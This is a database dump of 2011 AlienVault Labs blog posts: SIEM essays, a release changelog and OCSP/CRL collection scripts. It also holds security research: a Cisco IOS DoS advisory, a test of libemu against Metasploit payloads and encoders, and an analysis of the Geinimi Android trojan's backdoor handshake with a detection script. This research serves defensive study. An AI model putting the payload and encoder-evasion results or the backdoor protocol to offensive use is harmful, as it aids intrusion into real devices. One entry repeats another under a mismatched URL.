INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (120, 'SIEM for ITIL-Mature Incident Response (Part 2)', 'Conrad Constantine', 'December 5, 2011 ', 'In between firefighting the crisis of the week, we hope you have time to read the latest in my series on the path to using SIEM as the foundation for building an Incident Response team that adds value to the enterprise outside of crisis times. Once I started on this document series it become obvious that it wasn’t going to be something that could be summarized in a handful of short screeds. This is part 2, intended as an inspirational taster for how to leverage SIEM to drive a directed, (semi) predictable workflow for Incident Response work.SIEM for ITIL Incident Response - Part 2', '', '/blogs/labs-research/siem-for-itil-mature-incident-response-part-2');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (121, 'SIEM for ITIL-Mature Incident Response (Part 1)', 'Conrad Constantine', 'November 28, 2011 ', 'Incident Response is a field stuck in perpetual-firefighting mode, when it exists at all as a formalized unit. Yet as major breaches continue to happen, Incident Response proves to be possibly the most essential part of any Enterprise Security Program; in the words of Bruce Schneier:“You can’t defend. You can’t prevent. The only thing you can do is detect and respond.And yet, this most vital of components is still carried out as an arcane discipline, rarely measured or documented in a fashion that allows any measurement of its true effectiveness or value within the business.  ITIL presents a framework for service maturity and capabilities within Information Technology, and has components for Incident Response, but this is for general Service Incidents, and only partially translate towards Intrusion Response. SIEM technologies present the capacity for extracting actionable information from system logs and data, but do little to directly enable effective workflow within the business unit.In a series of documents on this subject, we will be laying out the groundwork for using SIEM and event correlation, to create a mature Security Incident Response program that can demonstrate and document repeatable, measurable processes, demonstrate ongoing value to the business beyond being merely a cost of doing business today, and provide business-relevant metrics that can fuel Business Intelligence analysis and demonstrate clearly resourcing requirements and gap analysis.SIEM for ITIL Incident Response - Part 1', 'siemitilcirt', '/blogs/labs-research/siem-for-itil-mature-incident-response-part-1');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (122, '8 Years of OSSIM', 'Conrad Constantine', 'November 22, 2011 ', 'We love data visualization, it’s true, and Information Security is always in need of new ways to adapt visualization techniques to mining through event data. This is a particular visualization engine I’ve been looking at lately to adapt for replaying complex timelines (e.g. replays of Breach evidence)… but out of the box, it does an excellent job of displaying the change history of source code repositories: so we thought we’d give it a run through the OSSIM repository logs…all of them…\nWatch the entire 8 year history of OSSIM development, in 7 minutes:\n\n(Produced with the GOURCE visualization engine - Download Gource Here)', '', '/blogs/labs-research/8-years-of-ossim');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (123, 'Bubba Xyzzy is born!', 'Dominique Karg', 'November 11, 2011 ', 'Hey all,we’d like to introduce you to our new little Alien mascot. You’ve seen him for about a month here on the Labs page but he’ll be much more predominant around Alienvault in the near future. No worries, he’ll never become annoying like “Clippy” (“I see you are trying to do a security analysis. Would you like for me to start a vuln scan for you too?” :P).Anyway, as part of the launch and our upcoming 3.1 release (due on Monday, 2011-11-14), we want to hand out exclusively designed t-shirts of Bubba to people who’ve been active in the community for long (you know who you are), friends of the cause and of course customers (with an active SIEM/Logger suscription).So, if you are in one of these categories please go ahead and fill in your data here:T-shirt information formWe’ll let you know when the things ship, unfortunately they’ll arrive next week or the week after, we’d have loved to get them out as sort of a “surprise”.So, without further delay, please meet Bubba :-)(btw, the Xyzzy part comes from here: http://en.wikipedia.org/wiki/Xyzzy. Cheers Conrad ;-) )', 'alienvaultmascotbubba xyzzyalien', '/blogs/labs-research/bubba-xyzzy-is-born');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (124, 'Massively collecting CRL and OCSP information', 'Jaime Blasco', 'November 3, 2011 ', 'As part of the IP reputation project we are writing a small engine to avoid false positives and whitelisting some common ips/networks.Usually when you execute a binary on a sandbox and the executable file has been signed, you receive a lot connections to the servers hosting the Certificate Revocation Lists (CRL) and the Online Certificate Status Protocol (OCSP).To avoid processing this ips, we use some scripts to parse and extract the most used CRL and OCSP servers extracting this information from certificates.Right now we are using the EFF SSL Observatory dataset and also the Alexa Top 1M list.Let’s begin with the SSL Observatory database. Once we have the Mysql database ready, execute the following sql query to extract the OCSP URIs:select `X509v3 extensions:Authority Information Access:OCSP - URI` as ocsp,count(*) as total INTO OUTFILE ‘/tmp/ocsp.csv’ FIELDS TERMINATED BY ‘,’ OPTIONALLY ENCLOSED BY ‘“’ LINES TERMINATED BY ‘\\n’ from all_certs where `X509v3 extensions:Authority Information Access:OCSP - URI` is not NULL group by ocsp order by total desc;Then you can use this script http://alienvault-labs-garage.googlecode.com/svn/trunk/certs/ocsp.py [no longer available] to parse the file:[email protected]:~$ python ocsp.py /tmp/ocsp.csv ocsp.godaddy.comocsp.starfieldtech.comocsp.startssl.comocsp.cacert.orgocsplevel101.ipsca.com...We can do the same for CRL entries using this other script http://alienvault-labs-garage.googlecode.com/svn/trunk/certs/crl.py [no longer available]:[email protected]:~$ python crl.py /tmp/crls.csv crl.geotrust.comcrl.comodoca.comcrl.comodo.netSVRIntl-crl.verisign.com...The other script http://alienvault-labs-garage.googlecode.com/svn/trunk/certs/alexa_top_certs.py [no longer available] I want to share parses the Alexa TOP 1M list, extracts the SSL certificate if https is supported and then extracts the OCSP/CRL URIS:jaimes-MacBook-Pro:PKIS jaime$ python2.7 alexa_top_certs.py http://crl.thawte.com/ThawteSGCCA.crlhttp://ocsp.thawte.comhttp://SVRIntl-crl.verisign.com/SVRIntl.crlhttp://ocsp.verisign.comhttp://www.gstatic.com/GoogleInternetAuthority/GoogleInternetAuthority.crlhttp://crl.geotrust.com/crls/secureca.crl...So mixing the outputs we have a list of the most used PKI servers that we can classify as normal activity.', 'pkiocspip reputationcertificatescrl', '/blogs/labs-research/massively-collecting-crl-and-ocsp-information');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (125, '3.1 coming soon', 'Dominique Karg', 'October 18, 2011 ', 'Big news on the release front. Some features didn’t make it into 3.0 due to QA but now this has been solved and we wanted to roll out a minor release (which is not so minor if you look at the Changelog…) with this data, before heading towards 4.0 (IPv6 support, huge improvements on the multitenancy/multicustomer side and big performance related database structure changes).So, without further delay, click below if you want to have a look at the 3.1 changelog. We’ll be updating the list (thanks Juanma, Pablo :-) ) as we get more things validated and tested and expect to release late next week. And futhermore, we’ve got a huge surprise hatching on the 11-11-11, I’ll keep you posted.3.1 (preliminary) Changelog below:Legend:* No specific mention\n\n+ Will be seen on video (bold+italic) \n\n- Will be talked about on the video (bold) \n\n\n\n* New Plugin: Amun Honeypot http://sourceforge.net/projects/amunhoney/\n\n+ New Feature: Raw tcpdump filter now available in Traffic Capture module\n\n* Improved alarm panel performance when loading groups of alarms\n\n+ Captions added to multiple Graphs in the Dashboards \n\n* Fixed small typos in the web interface\n\n* New Feature: Beep on alarm (Incidents -> Alarms), Play a sound on new alarms\n\n* Risk Maps can now query Nagios to get availability status in real time (Using mklivestatus http://mathias-kettner.de/checkmk_livestatus.html)\n\n* Display Issues Fixed when using IE\n\n* Queries updated in the Dashboard graphs to include new taxonomy categories\n\n+ Complete redesign of the Real Time event Viewer: Improved peformance and new filtering options \n\n* Limit results displayed on some graphs in the Dashboards panel\n\n* New feature: Voice control (More commands will be coming soon)\n\n* Removed dead code\n\n* Fix: Apache plugin updated in order to accept new event formats\n\n* New Feature: Ping added as a service in the host_services table (Availability Monitoring)\n\n* Fix:  Fixed decryption of passwords for OMP profiles (OpenVas)\n\n* Improved performance when using Custom Views (SIEM console)\n\n+ New Feature: Add PDF and CSV Report to Unique Events View (SIEM console) \n\n* Hide Analysis -> SIEM -> Statistics menu whenever EventStats is disabled\n\n* Clean Code: Deprecated sytle deleted\n\n* Fix: Issue when displaying the hardware info screen in firefox  \n\n--> http://sourceforge.net/tracker/?func=detail&aid=3159019&group_id=15&atid=100015\n\n* Improved Logger queries used in Asset report\n\n* Fixed utf-8 display issues\n\n* Fixed a problem when inserting services that existed in the db\n\n* Some issues fixed when generating a pdf report\n\n* Maps updated to use google Maps v3 api (No key required in google maps)\n\n* Fixed an issue displaying blank description in vuln reports when using some pdf readers\n\n+ New feature: Pcap web-based analyzer (Traffic capture) \n\n* New feature: Lilian date support in the agent\n\n* Fixed several memory leaks ans bugs in the Open Source OSSIM Server\n\n+ Improved the style sheet used to display alarms \n\n* Fixed a bug when trying to close an alarm group\n\n* Updated port service descriptions\n\n+ New feature: See related traffic (Right click menu) \n\n* New feature: See related events (Right click menu)\n\n+ New feature: See related security events (Right click menu)\n\n* New feature: Added loading message in multiple pages\n\n* New permissions for the new menus\n\n+ New feauture: Display IDM data in OSSEC management interface when IDM is enabled \n\n+ New feature: Add a message when loading Logger graphs \n\n* New feature: New action availability (Policy & Actions) -> Open a new ticket\n\n* Font changed when displaying pcap file in SIEM Console\n\n* Logger top graph now uses GMT+tz\n\n+ IDM Support in SIEM Console \n\n* Fix: Increase memory limit in Asset report\n\n* Support new formats in the Snare plugin\n\n* Fix: Allow 0.0.0.0/0 as an agent in the OSSEC Web Interface (DHCP Enviroments)\n\n* New mcafee-epo plugin\n\n* Fixed connection issues between the framework and the database\n\n* Added a link to see event detail from Real Time Event Viewer\n\n* New feature: IDM output in the agent (Feeds the alienvault-idm daemon)\n\n- New feature: FTP plugins support \n\n* Fixed some issues when inserting networks with special characters on their names\n\n* Fixed some issues in the Risk Maps\n\n* Support \"All\" in the time frame selection when generating a report in the SIEM Console\n\n* Updated taxonomy filters in Dashboard Graphs\n\n* Fix: Removed noisy messages generated by the cron daemon\n\n- New feature: Logger support in more subreports \n\n* Fix: Snort rules were not displayed properly with some sids\n\n* Fix: Debug info removed from some log files\n\n* Fix: Asset properties display only the latest OS in each host\n\n* New feature: New function in the plugins normalize_date_american\n\n* New feature: New traffic lights in the Risk Maps\n\n* Fix: Fixed an issue when deleting the default tab in Dashboards panel\n\n* New plugin: Cisco-ips-syslog\n\n* New feature: Network Groups support in Risk Maps\n\n* Fixed an issue when exporting the SOX report in PDF format, some fonts were not properly displayed\n\n+ New feature: Show IP Reputation info in the real time event panel \n\n+ New menu: Ip reputation \n\n* Improved usability in some graphs: bigger clickable area\n\n- Updated chinese translation \n\n* Some message removed when starting the ossim agent\n\n* New feature: Pagination when displaying more than 50 agents in the web interface\n\n* Communication between the frameworkd and the agent now depends on the ip of the agent and not on the name of the agent\n\n* Fix: Error fixed when generating reports including Flows information\n\n* Removed unused links in Downloads\n\n* Fix: Fixed a bug when editing a network asset\n\n* Fix: Fixed an issue displaying RRD graphs for some networks\n\n* New plugin: Vmware-vcenter\n\n+ New feature: Show IP reputation info in Alarms \n\n+ New feature: Right click support in grouped alarms \n\n* Updated intrushield priority values\n\n+ New feature: Open a ticket from the Logger or SIEM console \n\n* New feature: IP reputation in the event detail\n\n* New feaure: Assing permissions to automatically generated tickets\n\n* Fix: Error when creating Nagios configuration files for some hosts\n\n+ New feature: Create host groups based on their location (For public IP addresses) \n\n* Updated bluecoat plugin\n\n* Updated cisco-3030 plugin\n\n* New feature: New categories on ticket status\n\n* Updated Netscreen firewall plugin\n\n* New feature: Display a message when deleting\n\n* New feature:  Email template for tickets in HTML format\n\n* Support the new nmap output format\n\n* Fix: Allow _ in indicator name (Risk Maps)\n\n* New plugin: Xtera\'s Ascenlink devices\n\n* Unused configuration options removed\n\n* New feature: Default custom views in the SIEM Console\n\n* Fix: Fixed some \"image not found\" in Jasper reports\n\n* Fix: Get rid of apache (already used by another worker) warnings at restart\n\n* Fix: No need to logout to update user\'s timezone\n\n* Fix: Issue when rotating logs when Fw1loggraber is enabled\n\n+ Improved the way plugin sids are loaded, the Server now loads much faster \n\n* Updated cisco-asa plugin\n\n* Added latitude and longitude information when importing assets using csv file\n\n* Updated pam_unix plugin\n\n* Updated real secure plugin\n\n* New feature: Search box in Configuration -> SIEM Components -> Sensors\n\n* Fixed several issues when displaying chinese characters\n\n* Fix: Issue when collecting  some multi-line events\n\n* New permission: Edit tickets\n\n* New feature: Collect from multiple devices when using the SDEE plugin\n\n* Fix: Error attaching big files in the Knowledge DB\n\n* Updated Vyatta plugin\n\n* Display a message when deleting alarms\n\n* New feature: Disable correlation directives\n\n* Fix: Display an error when images can not be displayed in reports\n\n* New feature: New reports for HIDS information\n\n* New feature: Find alarms containing an event type\n\n* New feature: Import networks using a CSV file\n\n- New feature: Add to DS Group button in Siem events \n\n* Fix: Allow inserting 0.0.0.0/1 as a network\n\n* New feature: Export Networks and host as a CSV file\n\n* New feature: Include remote loggers info in Asset Report\n\n* New feature: Support filtering when deleting alarms\n\n* Fix: Issue when stopping the network discovery tool (Nmap)\n\n* New feature: Allow ANY in traffic capture tool\n\n* Fix: styles in several pages (buttons, width,...)\n\n* New feature: Allow event forwarding whenever SIEM is disabled (Policy rules)\n\n* Fix: Small issues when working with multiple tzones in the web interface\n\n* Fix: Duplicates entries in sources.list\n\n* Updated compliance mappings\n\n* Speed up the process of generating reports\n\n* Fix: Issue when applying filters in the Metrics Report\n\n* New feature: Added FW rules for openvasm\n\n* New feature: Added FW rules for framework\n\n* Fix: Clean duplicated Nagios link in Apache configuration\n\n* New feature: New auto-complete options in the Logger console\n\n* New feature: MOTD is now installed when using distributed installation profiles\n\n* Fix: Bug when generating the geographic reports with some specific filters\n\n* Fix: Issue when updating the ossim-server password from ossim-reconfig\n\n* Fix: Typos\n\n* Fix: Avoid Ntop to connect to the internet to check the version\n\n* Fix: noisy perl messages new aliases for df, du enable timestamp in history\n\n* New feature: Further restrict kernel logging on the console\n\n* Improved Openvas4 auto-configuration\n\n* Updated init scripts\n\n* Use alienvault as the default hostname\n\n* Updated nagios stylesheet\n\n* Fix: Small issues in the availability report\n\n+ New feature: IP Reputation + New feature: IDM (Identity Management) \n\n* Fix: Use alienvault-update when ossim-update is executed\n\n* HA configuration in ailenvault-reconfig\n\n+ Updated Tshark (introducing Sharkvault) \n\n* Speed up the correlation process\n\n* Memory usage reduced when events are correlated\n\n* Memory usage reduction when thousands of networks are present in the inventory\n\n- New feature: IDM daemon alienvault-idm \n\n+ IDM and reputation added to custom SIEM views \n\n* New feature: Add a cron job for apt-get autoclean', '', '/blogs/labs-research/31-coming-soon');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (126, 'Advisory: Cisco IOS HTTP client DoS', 'Jaime Blasco', 'October 18, 2011 ', 'DESCRIPTION:There is a problem with the HTTP client implementation on Cisco IOS. If an administrator loads an application service via these commands:router#config\n\nConfiguring from terminal, memory, or network [terminal]?\n\nEnter configuration commands, one per line.  End with CNTL/Z.\n\nrouter(config)#application\n\nrouter(config-app)#service name http://ip_address/\n\nrouter(config-app-param)#endand the HTTP server responds with a special crafted HTTP response, the device will crash.AFFECTED VERSIONS:The vulnerability has been detected in a wide branch of Cisco IOS.VENDOR RESPONSE:http://tools.cisco.com/security/center/viewAlert.x?alertId=24436CREDITS:Jaime Blasco, Alienvault Labs', 'ciscovulnerabilityiosadvisory', '/blogs/labs-research/advisory-cisco-ios-http-client-dos');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (127, 'New code piece: automatic plugin detection', 'Dominique Karg', 'October 16, 2011 ', 'We just uploaded a snippet written earlier this year, it requires regexp.py and can automatically identify the log type a certain IP is sending via syslog.', 'ossimalienvaultsiemplugindetection', '/blogs/labs-research/new-code-piece-automatic-plugin-detection');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (128, 'Logger benchmarking (commercial edition)', 'Dominique Karg', 'October 12, 2011 ', 'Hey all,I don’t want this to become a spam forum, nothing further in my intention than this, but Pascal ([email protected]) just shared some screenshots with us from a customer PoC, which are much more interesting than any internal benchmark we could do  in the labs.These screenshots show the Logger performing in the worst case scenario; when the search query is not matched while inserting events on disk. Two pics are provided with about 2 weeks of separation and the hardware is a L3000 appliance.Results are:~3 seconds for ~ 2.7 billion events.~4.5 seconds for ~ 3.2 billion events.These are the final steps of benchmarking and debugging and this new logger iteration should be available before end of the year (3.1 probably, not sure about the versioning tho). More on the final benchmark in the future, I’m thinking about interviewing some of our key people for the Community/Labs page and having Carlos talk about this would be great.Huge kudos to everyone involved, specially to Carlos, Juanma and Mihnea :-)Enjoy!', 'alienvaultperformancecommerciallogger', '/blogs/labs-research/logger-benchmarking-commercial-edition');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (129, 'Feature Focus 2: Custom Tickets', 'Dominique Karg', 'October 10, 2011 ', 'The second installment of our feature focus series, this time focused on custom tickets.\nCustom tickets are a good way to feed the system with information that cannot be fed automatically and requires human intervention, have a look at the video to find out more.', '', '/blogs/labs-research/feature-focus-2-custom-tickets');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (130, 'RIP Steve', 'Dominique Karg', 'October 7, 2011 ', '', '', '/blogs/labs-research/rip-steve');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (131, 'New section: feature focus. Today: ip reputation and voice control', 'Dominique Karg', 'October 6, 2011 ', 'Hey all,\ntoday I’m proud to introduce the first voice controlled SIEM. One step closer to the war against the machines.\nI hope to be doing a lot of these and also to be expanding the tutorials with some videos and such.\nAny critics and feedback, be it positive or negative is welcome. The video quality is a bit bad I think and my acting really sucks but it’s the first one, so hey, what do you expect :-)', 'ossimalienvaultreputationfeature focusvoice command', '/blogs/labs-research/new-section-feature-focus-today-ip-reputation-and-voice-control');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (132, 'Metasploit Payloads VS Libemu', 'Jaime Blasco', 'October 4, 2011 ', 'Today we will analyze the detection capabilities of libemu http://libemu.carnivore.it/ [no longer available] using the Metasploit payloads.Libemu is a small library to detect and analyze x86 shellcodes using heuristics.We have written a small script to automatically generate Metasploit payloads and see if libemu is able to detect them. You can download it here http://alienvault-labs-garage.googlecode.com/svn/trunk/metasploit/payloads.py [no longer available]. You’ll need libemu compiled with the python extensions and the Metasploit’s xmlrpc interface up:./msfrpcd -P test -U test -S -t WebThe script generates all the Metasploit payloads and then use libemu to check if it detects the shellcode. Here is the list of payloads detected by libemu:PayloadOffsetwindows/x64/meterpreter/bind_tcp-4657153windows/meterpreter/bind_nonx_tcp4windows/meterpreter/bind_ipv6_tcp1windows/vncinject/bind_nonx_tcp4windows/shell/bind_ipv6_tcp1windows/x64/shell_bind_tcp-4657153windows/vncinject/bind_ipv6_tcp1windows/meterpreter/bind_tcp-4657153windows/patchupmeterpreter/bind_ipv6_tcp1windows/patchupmeterpreter/bind_nonx_tcp4windows/vncinject/bind_tcp-4657153windows/x64/shell/bind_tcp-4657153linux/x86/adduser-4657153linux/x86/chmod-4657153windows/adduser-4657153windows/shell/bind_nonx_tcp4windows/x64/vncinject/bind_tcp-4657153windows/patchupmeterpreter/bind_tcp-4657153windows/shell_bind_tcp-4657153windows/shell/bind_tcp-4657153As we can see libemu is able to detect some of the shellcodes. The next step is to select one of the detected shellcodes and apply different encoders to see if libemu is still able to detect the shellcode.For this purpose we select windows/x64/meterpreter/bind_tcp and apply different encoders using this script http://alienvault-labs-garage.googlecode.com/svn/trunk/metasploit/encoders.py [no longer available].Results:EncoderOffsetx64/xorno detectedx86/alpha_mixedno detectedx86/alpha_upperno detectedx86/avoid_utf8_tolowerno detectedx86/call4_dword_xor0x86/context_cpuid0x86/context_stat0x86/context_time-4657153x86/countdown0x86/fnstenv_mov0x86/jmp_call_additive1x86/nonalpha-4657153x86/shikata_ga_nai-4657153x86/single_static_bit-4657153So, after this study we can conclude that libemu is a trustful library to detect most of the shellcodes used nowadays.', 'libemumetasploitshellcodeencoder', '/blogs/labs-research/metasploit-payloads-vs-libemu');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (133, 'Metasploit Payloads VS Libemu', 'Jaime Blasco', 'October 4, 2011 ', 'Today we will analyze the detection capabilities of libemu http://libemu.carnivore.it/ [no longer available] using the Metasploit payloads.Libemu is a small library to detect and analyze x86 shellcodes using heuristics.We have written a small script to automatically generate Metasploit payloads and see if libemu is able to detect them. You can download it here http://alienvault-labs-garage.googlecode.com/svn/trunk/metasploit/payloads.py [no longer available]. You’ll need libemu compiled with the python extensions and the Metasploit’s xmlrpc interface up:./msfrpcd -P test -U test -S -t WebThe script generates all the Metasploit payloads and then use libemu to check if it detects the shellcode. Here is the list of payloads detected by libemu:PayloadOffsetwindows/x64/meterpreter/bind_tcp-4657153windows/meterpreter/bind_nonx_tcp4windows/meterpreter/bind_ipv6_tcp1windows/vncinject/bind_nonx_tcp4windows/shell/bind_ipv6_tcp1windows/x64/shell_bind_tcp-4657153windows/vncinject/bind_ipv6_tcp1windows/meterpreter/bind_tcp-4657153windows/patchupmeterpreter/bind_ipv6_tcp1windows/patchupmeterpreter/bind_nonx_tcp4windows/vncinject/bind_tcp-4657153windows/x64/shell/bind_tcp-4657153linux/x86/adduser-4657153linux/x86/chmod-4657153windows/adduser-4657153windows/shell/bind_nonx_tcp4windows/x64/vncinject/bind_tcp-4657153windows/patchupmeterpreter/bind_tcp-4657153windows/shell_bind_tcp-4657153windows/shell/bind_tcp-4657153As we can see libemu is able to detect some of the shellcodes. The next step is to select one of the detected shellcodes and apply different encoders to see if libemu is still able to detect the shellcode.For this purpose we select windows/x64/meterpreter/bind_tcp and apply different encoders using this script http://alienvault-labs-garage.googlecode.com/svn/trunk/metasploit/encoders.py [no longer available].Results:EncoderOffsetx64/xorno detectedx86/alpha_mixedno detectedx86/alpha_upperno detectedx86/avoid_utf8_tolowerno detectedx86/call4_dword_xor0x86/context_cpuid0x86/context_stat0x86/context_time-4657153x86/countdown0x86/fnstenv_mov0x86/jmp_call_additive1x86/nonalpha-4657153x86/shikata_ga_nai-4657153x86/single_static_bit-4657153So, after this study we can conclude that libemu is a trustful library to detect most of the shellcodes used nowadays.', 'libemumetasploitshellcodeencoder', '/blogs/labs-research/raid-11-menlo-park-ca-notes-and-rants');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (134, 'OISF/Suricata Brainstorming session', 'Dominique Karg', 'September 19, 2011 ', 'Just attended the OISF Suricata brainstorming session, it was really fun (unlike the RSA one ;-)).Happening at the same venue than RAID 11 (which I’ll be attending with Jaime too), it was 3+ hours of brainstorming, discussing IDS/IPS and learning about a bunch of new concepts.I think they’re doing a real good job on it and the community driven roadmap is something I wish I had been able to do 8 years ago, in the early OSSIM stages.Anyway, we’ll accelerate the inclusion of Suricata into OSSIM for sure after what we’ve seen today, and I’m really looking forward to see the new features implemented :-)', '', '/blogs/labs-research/oisf-suricata-brainstorming-session');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (135, '3.0 is out!!!', 'Dominique Karg', 'September 16, 2011 ', 'We’re proud to announce the immediate availability of our newest release. This release has huge improvements, but the best way to check it out is:Check out the slideshare slides.Download it!Enjoy :-)', 'ossimalienvaultrelease3.0', '/blogs/labs-research/30-is-out');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (136, 'Top 5 reasons for choosing Alienvault', 'Dominique Karg', 'January 13, 2011 ', 'This was a response from a customer whom I’m keeping anonymous unless he wants to step up, I was glad to read that and it always feels good to have this type of feedback.Sure…here they are in order of importance to me.1. - Industry standard open source software - I don’t care who you are, if you are in IT or Security, you have heard of Snort, Nagios, ntop, etc.2. - Support - I wanted something that was supported by people who were proud of their product and who actually care about it’s success.3. - It works! - Issues with getting the hardware aside, the performance and stability of OSSIM is either on par or beyond other commercial products4. - Time to implement - We got the systems up and going in our production environment in 2 days, the tuning is ongoing, but it was exceptionally quick to implement.5. - Personal attention - Being supported by Dom and Santi, the guys who have been with the project since inception was a huge thing for me, they obviously care deeply about the company and it’s customers.6. - Cost - The cost of entry into the SIEM arena for most companies is a huge barrier, with OSSIM, that barrier has been all but removed.7. - Your daughter being a bad-ass hockey player was cool!  (you can quote me on this one!)  :o)', 'alienvault', '/blogs/labs-research/top-5-reasons-for-choosing-alienvault');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (137, 'Inside Geinimi Android Trojan. Chapter Two: How to check remotely the presence of the trojan', 'Jaime Blasco', 'January 4, 2011 ', 'In this chapter, we continue describing some of the trojan components. We realized that the code contains some ServerSocket stuff so let’s take a look at the system.To obtain more information about a process on android we can upload the lsof tool to a rooted via adb tools. You can download the lsof static file here http://android-group-korea.googlecode.com/files/lsof.arm926ejs.static [no longer available].To use the Android Debug Bridge (ADB) the device needs to have the debug mode enable:Settings > Applications > Development > USB DebuggingThen connecting the device to the host computer using a USB cable or using the android emulator to simulate a phone we can use the adb tools. To upload the lsof binary:jaime:tools jaimeblasco$ ./adb push lsof.static /data/\n\n633 KB/s (3517525 bytes in 5.420s)I recommend you to upload a busybox binary as well in order to be able to use commands like grep, find… You can obtain a busybox binary hereThen we can obtain a shell on the device running adb shell:jaime:tools jaimeblasco$ ./adb shell\n\n# id\n\nuid=0(root) gid=0(root)\n\n# cd /data/\n\n# chmod 777 busybox\n\n# chmod 777 lsof.staticNow we can use lsof to list interesting data about our process:# ps|./busybox grep -i monk\n\napp_32    526   33    109024 19224 ffffffff afd0eb08 S com.dseffects.MonkeyJump2\n\n# ./lsof.static -p 526 2>/dev/null\n\nCOMMAND   PID     USER   FD   TYPE     DEVICE    SIZE NODE NAME\n\n...\n\n...\n\ncts.Monke 526    10032    0u   CHR        1,3           42 /dev/null\n\ncts.Monke 526    10032    1u   CHR        1,3           42 /dev/null\n\ncts.Monke 526    10032    2u   CHR        1,3           42 /dev/null\n\ncts.Monke 526    10032    3w   CHR      10,58           55 /dev/log/main\n\ncts.Monke 526    10032    4w   CHR      10,56           57 /dev/log/radio\n\ncts.Monke 526    10032    5w   CHR      10,57           56 /dev/log/events\n\n...\n\n...\n\ncts.Monke 526    10032   10u  unix 0xc9f610c0         2515 socket\n\n...\n\n...\n\ncts.Monke 526    10032   20u  unix 0xc9fdb260         2519 socket\n\n...\n\n...\n\ncts.Monke 526    10032   26r   REG       31,1  570420  284 /data/app/com.dseffects.MonkeyJump2-1.apk\n\ncts.Monke 526    10032   27r   REG       31,1  570420  284 /data/app/com.dseffects.MonkeyJump2-1.apk\n\ncts.Monke 526    10032   28r   REG       31,1  570420  284 /data/app/com.dseffects.MonkeyJump2-1.apk\n\ncts.Monke 526    10032   29u  IPv4       2534          TCP *:5432 (LISTEN)I have removed almost all the data, you can access a complete dump here http://alienvault-labs-garage.googlecode.com/svn/trunk/geinimi/lsof_geinimi.txt [no longer available]As you can see the process has a listening socket on port 5432Let’s start inspecting the code with the purpose of interacting with the listening socket. Before we begin looking at the code, this document comes handy to understand the Dalvik opcodes.The thread that starts and manages the socket is defined in ./smali/com/dseffects/MonkeyJump2/jump2/j.smaliAs we can see a ServerSocket object is created (from Lcom/dseffects/MonkeyJump2/jump2/e;->c), the accept() method is called and it returns a socket object to access java/io/InputStream and java/io/OutputStream to receive and send data. Let’s see how the ServerSocket is created:  Following the code we can see how the ServerSocket is created listening on port 0x15t 0x38t => 5432.So, let’s continue analyzing the run() method of the previous j class.  Once the connection is established, the thread reads 256 bytes from the socket and builds a string, if the data received is “hi,are you online?” the program answer with he string “yes,I\\‘m online!”.Then the client should send two bytes that the program will use later. Finally it sends 0xa 0x05 and closes the connection.  Based on the two bytes sent, the program does some checks.It gets the string [const-string v0, “10.7”] from Lcom/dseffects/MonkeyJump2/jump2/e/k;->f() and split the string saving the integers to v0 and v1 respectively.Then if the first byte we sent (v3) is greater than v1 (7) the program jumps to :cond_0.Basically the program set a boolean variable on the service object that makes the service not to restart if the service stops. Finally it calls stopSelf() function to stop the service.Let’s use this little script http://alienvault-labs-garage.googlecode.com/svn/trunk/geinimi/geinimi_comm.py [no longer available] to recreate the communication to restart the service.jaime:tools jaimeblasco$ python geinimi_comm.py 192.168.1.32 5432\n\nReceived \"yes,I\'m online!\"\n\nSending \'p\\x00\'\n\nReceived \'\\n\'\n\nReceived \'\\x05\'If we take a look at the android event log using \"logcat -b events\", we see that a destroy_service request has been sentI/am_destroy_service(   61): [1140917416,com.dseffects.MonkeyJump2/.jump2.c.AndroidIME,301]I have written a nmap script to remotely check the presence of the trojan. Download http://alienvault-labs-garage.googlecode.com/svn/trunk/geinimi/geinimi.nse [no longer available]jaime:nmap-5.35DC1 jaimeblasco$ ./nmap -v --script=geinimi -p5432 192.168.1.32\n\nStarting Nmap 5.35DC1 ( http://nmap.org ) at 2011-01-04 17:49 CET\n\nNSE: Loaded 1 scripts for scanning.\n\nDiscovered open port 5432/tcp on 127.0.0.1\n\nCompleted Connect Scan at 17:49, 0.00s elapsed (1 total ports)\n\nNSE: Script scanning 127.0.0.1.\n\nNSE: Starting runlevel 1 (of 1) scan.\n\nInitiating NSE at 17:49\n\nCompleted NSE at 17:49, 5.00s elapsed\n\nNmap scan report for localhost (127.0.0.1)\n\nHost is up (0.00013s latency).\n\nPORT     STATE SERVICE\n\n5432/tcp open  postgresql\n\n|_geinimi: Geinimi trojan presentMy conclusion is that the authors used this service during development but maybe the service was made to detect compromised phones. What do you think?.On the other hand Tim Strazzere from Lookout, has just told me a better theory: he discovered that the 10.7 string is the SDK version so this is a way to update the trojan version.', 'malwarereverse engineeringandroidtrojangeinimicommand-and-control', '/blogs/labs-research/inside-geinimi-android-trojan-chapter-two-how-to-check-remotely-the-presen');
